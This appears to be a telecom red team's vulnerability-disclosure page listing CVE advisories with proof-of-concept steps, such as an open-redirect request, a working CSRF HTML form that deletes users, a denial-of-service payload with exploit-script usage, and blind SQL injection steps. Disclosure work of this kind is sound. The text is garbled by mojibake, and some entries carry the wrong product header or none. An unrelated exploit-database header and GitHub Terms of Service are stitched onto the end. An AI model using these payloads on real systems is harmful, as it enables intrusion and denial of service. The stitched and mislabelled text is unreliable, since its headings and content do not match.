# Vulnerability Research & Advisor

### FinalitÃ  e modalitÃ  operative

![](/content/dam/default/FAQ/meno.svg)

Nellâambito delle attivitÃ  di Cybersecurity di TIM, Ã¨ stato costituito un gruppo di lavoro dedicato allâesecuzione di Security Assessment (Red Team), che si occupa di analizzare software sviluppato on-demand, software di mercato e firmware.

Tra gli obiettivi del team câÃ¨ quello di rilevare le vulnerabilitÃ  che un potenziale attaccante potrebbe sfruttare per eseguire degli attacchi informatici verso le infrastrutture di TIM ed evidenziarne gli impatti reali rilevati.

LâattivitÃ  non si limita alla sola verifica delle vulnerabilitÃ  note, ma include unâattivitÃ  di ricerca specifica con lâobiettivo di scoprire eventuali nuove vulnerabilitÃ  non ancora conosciute pubblicamente (vulnerabilitÃ  0day).

Qualora vengano rilevate vulnerabilitÃ  0day, si procede con una âdivulgazione responsabileâ verso il produttore del prodotto analizzato, comunicandogli prontamente e in via confidenziale le vulnerabilitÃ  scoperte, in modo che possa replicarle e produrre una contromisura (patch) entro 90 giorni dalla notifica ricevuta.

In seguito al rilascio della contromisura (patch), oppure trascorsi i 90 giorni dalla segnalazione, si procede alla pubblicazione, classificando le vulnerabilitÃ  sul Mitre (CVE, Common Vulnerabilities and Exposures).

Analoghe azioni vengono intraprese nellâambito dei processi di Security Testing e Gestione Incidenti (Incident Handling) di TIM, qualora portino a scoprire vulnerabilitÃ  non ancora note al produttore e alla comunitÃ .

### CVE-2024-52949â iptraf-ng

![](/content/dam/default/FAQ/piu.svg)

**Vulnerability Description**: Stack-based Buffer Overflow - CWE-121

**Software Version**: 1.2.1

**NIST**: https://nvd.nist.gov/vuln/detail/CVE-2024-52949

**CVSS**:

**Severity:**

**Credits**: Massimiliano Ferraresi, Massimiliano Brolli

A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function). Buffer overflows often can be used to execute arbitrary

**Step-by-step instructions and PoC**

During an assessment we fuzzed the -C argument with AFL++ with the following command

sudo ./afl-fuzz -i /in -o /out -- ./iptraf-ng -C @@

The /in directory contains various types of playlists that AFL can fuzz and iterate over. After one day of fuzzing, we found 4 types of config that crash iptraf-ng. The issue consistently occurs in the strcpy function doesnât control the size and is possible to overflow memory in the stack

**Security Impact**

An attacker can use a malicious configuration file to execute arbitrary code on the victim's program with root privilege.

### CVE-2024-49351â IBM Workload Scheduler

![](/content/dam/default/FAQ/piu.svg)

**Vulnerability Description:** Plaintext Storage of a Password- CWE-256

**Software Version:** 9.5.0

**NIST**: <https://nvd.nist.gov/vuln/detail/CVE-2024-49351>

**CVSS:**5.5

**Severity:** Medium

**Credits:** Alberto Arganese, Cristian Castrechini, Federico Draghelli, Massimiliano Brolli

An Improper Password Storage vulnerability exists in the connection properties panel under the Administration tab. This flaw allows authenticated remote attackers with administrator privileges to access and read the engine connection password in cleartext.

**Security impact**

Attackers who obtain this information can gain unauthorized access to sensitive systems, potentially escalating privileges and compromising data. This exposure can further enable lateral movement within the network, increasing the attack surface. Ultimately, it undermines the integrity of the entire system, leading to potential data breaches and reputational damage.

### CVE-2024-9329 â Eclipse Glassfish

![](/content/dam/default/FAQ/piu.svg)

**Vulnerability Description:** Improper Handling of Parameters - CWE-233

**Software Version:** 7.0.15

**NIST**: <https://nvd.nist.gov/vuln/detail/CVE-2024-9329>

**CVSS:** 6.1

**Severity:** Medium

**Credits:** Marco Ventura, Claudia Bartolini, Andrea Carlo Maria Dattola, Debora Esposito, Massimiliano Brolli

The Host HTTP parameter could cause the web application to redirect to the specified URL, when the requested endpoint is '/management/domain'. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.

**Step-by-step instructions and PoC**

The application presents an Open Redirect on the Host parameter, when the /management/domain endpoint is requested via an HTTP GET request.

**Affected Endpoints**

URL: https://[IP]:[PORT]/management/domain

HTTP Parameter: Host

Figure 2: payload and evidence

[Click To Enlarge](https://www.gruppotim.it/content/dam/gt/footer/responsible-disclosure/HostChangedVuln.jpg)

To perform this attack, the attacker does not need to be authenticated to the target application.

Security Impact

An attacker can construct a URL within the application that causes a redirection to an arbitrary external domain. This behaviour can be leveraged to facilitate phishing attacks against users of the application. The ability to use an authentic application URL, targeting the correct domain and with a valid SSL certificate (if SSL is used), lends credibility to the phishing attack because many users, even if they verify these features, will not notice the subsequent redirection to a different domain.

### CVE-2024-9054 â Microchip TP4100

![](/content/dam/default/FAQ/piu.svg)

**Vulnerability Description**: RCE on file configuration parameter - CWE-78

**Software Version**: 2.3.12

**NIST**: <https://nvd.nist.gov/vuln/detail/CVE-2024-9054>

**CVSS**: 8.8

**Severity:** High

**Credits**: Armando Huesca Prida, Marco Negro, Antonio Carriero, Vito Pistillo, Davide Renna, Manuel Leone, Massimiliano Brolli

The device doesn't correctly sanitize parameters content of the configuration file. An attacker able to upload a new configuration file could insert in the parameter 'secret\_key' malicious bash commands that will be executed by the device.

**Step-by-step instructions and PoC**

A malicious user has got a configuration file or can download it from the device web GUI . This user could locally modify the content of this file because it is in cleartext. Specifically, a bash command could be inserted in a parameter (âshared\_keyâ) present in the xml structure of the file. Once this file is loaded, after authentication, through the web GUI, the device executes the command inserted.

**Affected Endpoints**

**URL:** http://<device\_IP>/config\_restore

**XML Parameter:** secret\_key

Below the evidence with the vulnerability details and the payloads used.

Payload used to exploit the vulnerability:

POST /config\_restore HTTP/1.1

Figure 3: RCE

[Click To Enlarge](/content/dam/gt/footer/vulnerability-research/9054/RCE.jpg)

**Security Impact**

A malicious user with the access to the web GUI of the device could insert a bash command to construct a reverse shell to the device and to control it. Another situation could be represented by a malicious user that reaches the device network and knows the structure of the configuration file, that, through social engineering techniques, forces a user with access to the web GUI to load the infected file and to reach the same objective reported above.

### CVE-2024-7801 â Microchip TP4100

**Severity:**

**Credits**: Marco Ventura, Claudia Bartolini, Massimiliano Brolli

In OpenTextâ¢ Operations Agent, version 12.20, 12.21, 12.22, 12.23, 12.24, 12.25 and 12.26, is possible to perform Cross-site scripting Stored attacks. This vulnerability allows an attacker to compromise the interactions that users have with the vulnerable application. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.

**Step-by-step instructions and PoC**

A remote user that has the permissions to modify the agent configuration file, can perform Cross-site scripting Stored attacks. In particular, by adding a malicious payload within the CORE\_ID value, the attacker can inject an arbitrary javascript code in the HTML page.

**Severity:**

**Credits**: Stefano CarbÃ¨, Cristina Coppola, Andrea Carlo Maria Dattola, Stefano Scipioni, Massimiliano Brolli

The vulnerability occurs in ZENIC-ONE ZTE R58, version 16.22.40, when user-supplied information in an Excel (XLSX) file is not neutralized or is neutralized incorrectly so that special elements could be interpreted as a command when the file is opened by a spreadsheet product.

**Step-by-step instructions and PoC**

A remote user authenticated to the web application âZenic-Oneâ is able to clone a job from the GUI and, by intercepting the HTTP Request, can inject a payload in the âneIdâ parameter. Thus, when the Excel report for that job is downloaded by any user, clicking on the infected cell executes the payload on the victim's operating system.

Affected Endpoints

Â·       URL: https://[IP]:[PORT]/uportal/framework/defaulthtml#/\_mw-upgrade-task-management

Â·       HTTP Parameter: neId

Below is the evidence with the vulnerability details and the payloads used.

This first step consists of the interception of the POST HTTP request generated by the âNewâ button on the GUIâs  Upgrade Job Section after clicking the 'clone' button of a job.

### CVE-2022-45175 â LiveBox Collaboration vDesk

![](/content/dam/default/FAQ/piu.svg)

**Vulnerability Description**: Insecure Direct Object Reference (Cached Files) â CWE-639

**Software Version**: <= v.018

**NIST**: <https://nvd.nist.gov/vuln/detail/CVE-2022-45175>

**CVSv3**: **6.5**

**Severity: Medium**

**Credits**: Luca Borzacchiello, Massimiliano Brolli

An issue was discovered in LIVEBOX Collaboration vDesk through v018. An Insecure Direct Object Reference can occur under the 5.6.5-3/doc/{ID-FILE]/c/{N]/{C]/websocket endpoint. A malicious unauthenticated user can access cached files in the OnlyOffice backend of other users by guessing the file ID of a target file.

**Step-by-step instructions and PoC**

A malicious user can fool vShare (through a WebSocket) to return a link to the OnlyOffice

cache of text files, even of other users.

The vulnerability can be exploited in the following way:

1.     the attacker opens a text file in his vShare, this will open a websocket towards vdeskoffice;

2.     the attacker looks at the history of websocket requests, and finds the one that asks for the cached file;

the attacker modifies the ID of its own file with the target one. The target ID could be obtained: (a) performing a brute-force attack (32-bit of entropy), (b) looking at the browser 1.     history of the victim, and looking for a link with the following shape: [...]/5.6.5-3/doc/[ID]/... where [ID] is the target file ID.

Payload used to exploit the vulnerability:

![](/content/dam/gt/footer/vulnerability-research/CVE-2022-45175_1.png)

Figure 1 Websocket payload with a spoofed "docid" (in yellow). The destination websocket is opened by the attacker and has the following shape: vdeskoffice.[HOST]/5.6.5-3/doc/[ID-FILE]/c/[N]/[C]/websocket. Notice that [ID-FILE] is the ID of the file of the attacker, and its different from the one inserted in the body of the websocket.

Figure 2 Websocket request and response. In the response (bottom right of the image) we can see the link to a file âEditor.binâ. The file is the target document in DOCY format, that can be downloaded by the attacker.The file contains the content of the target document encoded in UTF-16LE format. If the target file was aâ.txtâ file, we would have seen here a link to the file directly.

**Vulnerability Description**: Improper Authentication (Bypass Two-Factor Authentication for SAML Users - Bad Backup Code Check)- CWE-287

**Software Version**: <= v.018

**NIST**: <https://nvd.nist.gov/vuln/detail/CVE-2022-45174>

**CVSv3**: **9.8**

**Severity: Critical**

**Credits**: Antonella Marino, Massimiliano Brolli

An issue was discovered in LIVEBOX Collaboration vDesk through v018. A Bypass of Two-Factor Authentication for SAML Users can occur under the /login/backup\_code endpoint and the /api/v1/vdeskintegration/challenge endpoint. The correctness of the TOTP is not checked properly, and can be bypassed by passing any string as the backup code.

**Step-by-step instructions and PoC**

The application allows a user to set a âBackup Codeâ to be used during the two-factor

authentication (instead of using the TOTP).

Unfortunately, for SAML users, the correctness of the TOTP is not checked correctly, and

can be bypassed passing any string as backup code.

The vulnerability can be exploited directly from the web-ui by:

1.     logging into the vDesk web application as SAML user;

2.     selecting the âbackup codeâ option;

3.     inserting any string in the form.

**Software Version**: <= v.018

**NIST**: <https://nvd.nist.gov/vuln/detail/CVE-2022-45173>

**CVSv3**: **9.8**

**Severity: Critical**

**Credits**: Massimiliano Ferraresi, Massimiliano Brolli

An issue was discovered in LIVEBOX Collaboration vDesk through v018. A Bypass of Two-Factor Authentication can occur under the /api/v1/vdeskintegration/challenge endpoint. Because only the client-side verifies whether a check was successful, an attacker can modify the response, and fool the application into concluding that the TOTP was correct.

**Step-by-step instructions and PoC**

The web application implements two-factor authentication through a TOTP code. To check

whether the inserted TOTP is correct, the web-application implements the API

/api/v1/vdeskintegration/challenge. Unfortunately, only the client-side verifies

whether the check was successful, allowing an attacker to modify the response, and fool the

application that the TOTP was correct.

**Vulnerability Description**: Absolute Path Traversal- CWE-36

**Software Version**: 5.2.0-20211008

**NIST**: <https://nvd.nist.gov/vuln/detail/CVE-2022-39812>

**CVSv3**: **7,5**

**Severity: High**

**Credits**: Luca Carbone, Fabio Romano, Stefano Scipioni, Massimiliano Brolli

Italtel NetMatch-S CI 5.2.0-20211008 allows Absolute Path Traversal under NMSCI-WebGui/SaveFileUploader. An unauthenticated user can upload files to an arbitrary path. An attacker can change the uploadDir parameter in a POST request (not possible using the GUI) to an arbitrary directory. Because the application does not check in which directory a file will be uploaded, an attacker can perform a variety of attacks that can result in unauthorized access to the server.

**Step-by-step instructions and PoC**

An unauthenticated user can upload files in an arbitrary path using a specific functionality of the web application. An attacker can change the âuploadDirâ parameter in the POST request (not possible using the GUI) to an arbitrary directory. Since the application does not check in which directory the file will be uploaded, an attacker can perform a variety of attacks that can result in unauthorized access to the server.

Below are the evidences with the vulnerability details and the payloads used. In this case, uploadDir was changed from */var/tmp/external/* to */home/oam/*

**Vulnerability Description**: Cross-Site Request Forgery (CWE-352)

**Software Version**: v22.0.0.62

**NIST**: <https://nvd.nist.gov/vuln/detail/CVE-2022-30280>

**CVSv3**: **8.8**

**Severity: High**

**Credits**: Massimiliano Ferraresi, Massimiliano Brolli

/SecurityManagement/html/createuser.jsf in Nokia NetAct 22 allows CSRF. A remote attacker is able to create users with arbitrary privileges, even administrative privileges. The application (even if it implements a CSRF token for the random GET request) does not ever verify a CSRF token. With a little help of social engineering/phishing (such as sending a link via email or chat), an attacker may trick the users of a web application into executing actions of the attacker's choosing. If the victim is a normal user, a successful CSRF attack can force the user to perform state changing requests like transferring funds, changing their email address, and so forth. If the victim is an administrative account, CSRF can compromise the entire web application.

**Step-by-step instructions and PoC**

![](/content/dam/default/FAQ/piu.svg)

**Vulnerability Description:** Multiple Stored Cross-Site Scripting - CWE-79

**Software Version:** 21.3.3.815

**NIST:** <https://nvd.nist.gov/vuln/detail/CVE-2021-41555>

**CVSv3: 6.1

Severity**: **Medium

Credits:** Luca Carbone, Mattia Campanelli, Alessandro Sabetta, Massimiliano Brolli

\*\* UNSUPPORTED WHEN ASSIGNED \*\*

In ARCHIBUS Web Central 21.3.3.815 (a version from 2014), XSS occurs in **/archibus/dwr/call/plaincall/workflow.runWorkflowRule.dwr** because the data received as input from clients is re-included within the HTTP response returned by the application without adequate validation. In this way, if HTML code or client-side executable code (e.g., Javascript) is entered as input, the expected execution flow could be altered. This is fixed in all recent versions, such as version 26.

**NOTE**: This vulnerability only affects products that are no longer supported by the maintainer. Version 21.3 was officially de-supported by the end of 2020.

### CVE-2021-41554 â ARCHIBUS Web Central

**CVSv3: 8.8

Severity**: **High

Credits:** Luca Carbone, Mattia Campanelli, Alessandro Sabetta, Massimiliano Brolli

\*\* UNSUPPORTED WHEN ASSIGNED \*\*

ARCHIBUS Web Central 21.3.3.815 (a version from 2014) does not properly validate requests for access to data and functionality in these affected endpoints:

**/archibus/schema/ab-edit-users.axvw**, **/archibus/schema/ab-data-dictionary-table.axvw**, **/archibus/schema/ab-schema-add-field.axvw**, **/archibus/schema/ab-core/views/process-navigator/ab-my-user-profile.axvw**. By not verifying the permissions for access to resources, it allows a potential attacker to view pages that are not allowed. Specifically, it was found that any authenticated user can reach the administrative console for user management by directly requesting access to the page via URL. This allows a malicious user to modify all users' profiles, to elevate any privileges to administrative ones, or to create or delete any type of user. It is also possible to modify the emails of other users, through a misconfiguration of the username parameter, on the user profile page.  This is fixed in all recent versions, such as version 26.

**NOTE**: This vulnerability only affects products that are no longer supported by the maintainer. Version 21.3 was officially de-supported by the end of 2020.

### CVE-2021-41553 â ARCHIBUS Web Central

**CVSv3: 9.8

Severity**: **Critical

Credits:** Luca Carbone, Mattia Campanelli, Alessandro Sabetta, Massimiliano Brolli

\*\* UNSUPPORTED WHEN ASSIGNED \*\*

In ARCHIBUS Web Central 21.3.3.815 (a version from 2014), the Web Application in **/archibus/login.axvw** assign a session token that could be already in use by another user. It was therefore possible to access the application through a user whose credentials were not known, without any attempt by the testers to modify the application logic. It is also possible to set the value of the session token, client-side, simply by making an unauthenticated GET Request to the Home Page and adding an arbitrary value to the **JSESSIONID** field. The application, following the login, does not assign a new token, continuing to keep the inserted one, as the identifier of the entire session. This is fixed in all recent versions, such as version 26.

**NOTE**: This vulnerability only affects products that are no longer supported by the maintainer. Version 21.3 was officially de-supported by the end of 2020.

### CVE-2021-38123 â Micro Focus Network Automation

**CVSv3: 6.1

Severity**: **Medium

Credits:** Veno Eivazian, Massimiliano Brolli

The Host HTTP parameter could cause the web application to redirect to the specified URL, when the requested endpoint is '/device.save.do'. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.

The application presents an Open Redirect on the Host parameter, when the /device.save.do endpoint is requested via an HTTP POST request.

To exploit the vulnerability, the following HTTP request is used:

POST /device.save.do HTTP/1.1

Host: this.is.my.domain.evil.net

An attacker could exploit this vulnerability by requesting random virtual host historical data and exhausting available filesystem resources. A successful exploit could allow the attacker to cause database errors and cause the device to become unresponsive to web-based management. Manual intervention is required to free filesystem resources and return the application to an operational state.

To exploit the vulnerability, intercept the browser session with a proxy like Burp Suite.

Then, go to the **Virtual Host Monitoring** section:

![CVE-2021-35492-1](/content/dam/gt/footer/red-team/CVE-2021-35492-1.png)

*FigureÂ 1: DoS - Virtual Host Monitoring - Web Interface*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35492-1.png)

An HTTP request will be automatically performed to view the historical data of the default virtual host.

The request on Burp Suite will be like the next screenshot.

![CVE-2021-35492-2](/content/dam/gt/footer/red-team/CVE-2021-35492-2.png)

*FigureÂ 2: DoS - Regular HTTP request*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35492-2.png)

Every time virtual host monitoring data is requested, a new file is created or appended on the filesystem.

By default, this is the starting condition on the folder /usr/local/WowzaStreamingEngine-4.8.11+5/stats/:

![CVE-2021-35492-3](/content/dam/gt/footer/red-team/CVE-2021-35492-3.png)

*FigureÂ 3: DoS - Filesystem on normal condition*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35492-3.png)

The attack can be performed using Burp Repeater, using the same request captured with the proxy, changing only the **vhost** parameter value. The response will be **HTTP 200 OK**:

![CVE-2021-35492-4](/content/dam/gt/footer/red-team/CVE-2021-35492-4.png)

*FigureÂ 4: DoS - New virtual host HTTP request*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35492-4.png)

Alternatively, the same can be achieved with the following payload:

GET /enginemanager/server/vhost/historical.jsdata?vhost=\_defaultVHost\_pippo\_&periodStart=2021-06-03T13%3A47%3A44%2B02%3A00&periodEnd=2021-06-03T14%3A47%3A44%2B02%3A00&\_=1622724285834 HTTP/1.1

On the filesystem side, a new file of 280 KB will be created, as depicted by the following screenshot:

![CVE-2021-35492-5](/content/dam/gt/footer/red-team/CVE-2021-35492-5.png)

*FigureÂ 5: DoS - New virtual host file on the filesystem*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35492-5.png)

To massively exploit this condition, multiple requests with different **vhost** values have to be sent.

To send those requests reliably, the browser session has to be left active.

Session timeout can be prevented by installing a browser plugin like **Tab Reloader** and configure it to refresh the tab every 1 minute, like the following example:

![CVE-2021-35492-6](/content/dam/gt/footer/red-team/CVE-2021-35492-6.png)

*FigureÂ 6: DoS - Session timeout prevention - Tab Reloader*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35492-6.png)

Then it is possible to create a custom script to randomize the vhost parameter to a new value to be sent every time.

./dos-exploit-wse.py

When executing such tool, it is possible to exhaust the filesystem by creating **5.5 GB** of files every **30 minutes**.

The effect can be summarized on the following screenshot, which depicts multiple files created on the filesystem and the difference of the **stats** directory size after 30 minutes of the tool execution:

![CVE-2021-35492-7](/content/dam/gt/footer/red-team/CVE-2021-35492-7.png)

### CVE-2021-35491 â Wowza Streaming Engine

![](/content/dam/default/FAQ/piu.svg)

**Vulnerability Description:** Cross-Site Request Forgery (CSRF) - CWE-352

**Software Version:** <= 4.8.11+5

**NIST:** <https://nvd.nist.gov/vuln/detail/CVE-2021-35491>

**CVSv3: 8.1

Severity**: **High

Credits:** Veno Eivazian, Massimiliano Brolli

A remote attacker is able to delete a user without the victim's knowledge, by enticing an authenticated admin user to visit an attacker's web page. The application does not implement a CSRF token for the GET request. An attacker can craft an HTML page with a forged request on /enginemanager/server/user/delete.htm URL and send it to the victim.

Prerequisites: None.

Step-by-step instructions and PoC

An authenticated user that visits a crafted HTML page with a forged request can delete a user on Wowza Streaming Engine on behalf of an administrator.

To exploit the vulnerability, a new user needs to be created for testing purpose.

First, create a new user from **Server** -> **Users** -> **Add User**.

![CVE-2021-35491-1](/content/dam/gt/footer/red-team/CVE-2021-35491-1.png)

*Figure 1: CSRF - User creation*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35491-1.png)

Then, **copy** the following HTML to a file served on another machine, in this case a local Kali Linux, in the file: /var/www/html/csrf-delete-user.html

<html>

     <body>

          <script>history.pushState('', '', '/')</script>

          <form action="http://wse.local:8088/enginemanager/server/user/delete.htm">

               <input type="hidden" name="userName" value="pippo" />

               <input type="submit" value="Submit request" />

          </form>

     </body>

</html>

Enable the local web server on the attacker machine:

sudo /etc/init.d/apache2 start

From an authenticated browser session to Wowza Streaming Engine with administrative privileges, open a new tab and go to the page http://127.0.0.1/csrf-delete-user.html.

![CVE-2021-35491-2](/content/dam/gt/footer/red-team/CVE-2021-35491-2.png)

*Figure 2: CSRF - PoC HTML page*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35491-2.png)

Select **Submit request**, to force the administrator to delete the selected user.

The request will be sent to the web application, and the user will be deleted:

Â

![CVE-2021-35491-3](/content/dam/gt/footer/red-team/CVE-2021-35491-3.png)

*Figure 3: CSRF - User deleted*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35491-3.png)

It was also found that the **wowzaSecurityToken** HTTP parameter is not present in this GET request. In this case, the application accepts the request and processes it every time.

This is not true in the case of user creation, where that parameter is present and correctly validated.

### CVE-2021-35490 â Thruk

![](/content/dam/default/FAQ/piu.svg)

**Vulnerability Description**: Â Stored Cross-Site Scripting - CWE-79

### CVE-2021-35487 â Nokia Broadcast Message Center

![](/content/dam/default/FAQ/piu.svg)

**Vulnerability Description:** Boolean Blind SQL Injection - CWE-89

**Software Version:** <= 11.1.0

**NIST:** <https://nvd.nist.gov/vuln/detail/CVE-2021-35487>

**CVSv3: 6.5

Severity**: **Medium

Credits:** Marco Raimondi, Francesco Pigini, Massimiliano Brolli

A remote user, authenticated on the Broadcast Message Center, can navigate the application in the ALERTS --> Manage Alerts section. Within Search Options it is possible to select Basic Search and by specifying the **extIdentifier** parameter, arbitrary queries in the application database can be executed.

Through these queries it is possible to extrapolate arbitrary information, not foreseen by the application logic, such as the user of the system that executes the queries, the dbms version, etc.

Depending on the permissions the user has on the database, different types of queries are possible and consequently different types of information can be extracted.

Payload used to exploit the vulnerability:

![CVE-2021-35487-0](/content/dam/gt/footer/red-team/CVE-2021-35487-0.png)

*Figure 0: Payload*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35487-0.png)

This first step consisted of inserting a single quote (') inside the search bar, in order to evaluate the behavior of the application. The result was an error message inside the database:

![CVE-2021-35487-1](/content/dam/gt/footer/red-team/CVE-2021-35487-1.png)

*Figure 1: Single quote database error message*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35487-1.png)

At this point we tried to see if it was possible to execute arbitrary queries on the application. In this specific case, we tried to get the name of the user who executes the queries on the database. To do this we combined the **mid()** and **user()** functions. Being a Blind SQL Injection, if the query result was "true" we would get all the database alerts, otherwise we would get nothing, and we would have to go on with the letters of the alphabet:

![CVE-2021-35487-2](/content/dam/gt/footer/red-team/CVE-2021-35487-2.png)

*Figure 2: True query request*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35487-2.png)

![CVE-2021-35487-3](/content/dam/gt/footer/red-team/CVE-2021-35487-3.png)

*Figure 3:Â True query page behavior with alarms*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35487-3.png)

The result of the query is the entire list of alarms, so the first letter of the username is after "**m**" in the alphabet.

![CVE-2021-35487-4](/content/dam/gt/footer/red-team/CVE-2021-35487-4.png)

*Figure 4:Â False query page behavior*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35487-4.png)

Using the letter **n**" we get nothing. Therefore, the first letter of the username is "**n**". Proceeding in this way it is possible to obtain the full name of the user.

At this point we try to confirm the username found by using the **user()** function directly:

![CVE-2021-35487-5](/content/dam/gt/footer/red-team/CVE-2021-35487-5.png)

*Figure 5:Â User() function true request*

*Figure 6:Â User() function true response page*

[Click here to enlarge the image](/content/dam/gt/footer/red-team/CVE-2021-35487-6.png)

As we can see from the last image, using only the user() function with the name found from the previous steps, we get again the complete list of alarms, confirming that the username is correct.

Similarly, it is possible to proceed to get more information from the database.

## Exploit Information

**Exploit Title:** Wowza Streaming Engine 4.8.11+5 - Denial of Service

**CVE:** [CVE-2021-35492](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35492)

**Date:** 2021-10-06

**Exploit Author:** N4nj0

**Software Link:** <https://www.wowza.com/products/streaming-engine>

**Version:** 4.8.11+5

**Tested on:** Wowza Streaming Engine <= 4.8.11+5

**Vulnerability Advisory:** <https://n4nj0.github.io/advisories/wowza-streaming-engine-i/>

TWowza Streaming Engine (known as Wowza Media Server) is a unified streaming media server software developed by Wowza Media Systems based in Colorado, in the United States of America and used by many US government entities such as NASA, US Air force, Boeing, New York Police Department and many other clients around the world.

I've found a uncontrolled resource consumption which enables a remote attacker to exhaust filesystem resources via the */enginemanager/server/vhost/historical.jsdata* `vhost` parameter. A successful exploit could allow the attacker to cause database errors and cause the device to become unresponsive to web-based management.

### Usage

`./dos-exploit-wse.py -u http://wse.local:8088 -s CDA32846E8763F62293AAE42FA72C86B`

`./dos-exploit-wse.py --url http://wse.local:8088 --session CDA32846E8763F62293AAE42FA72C86B`

## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
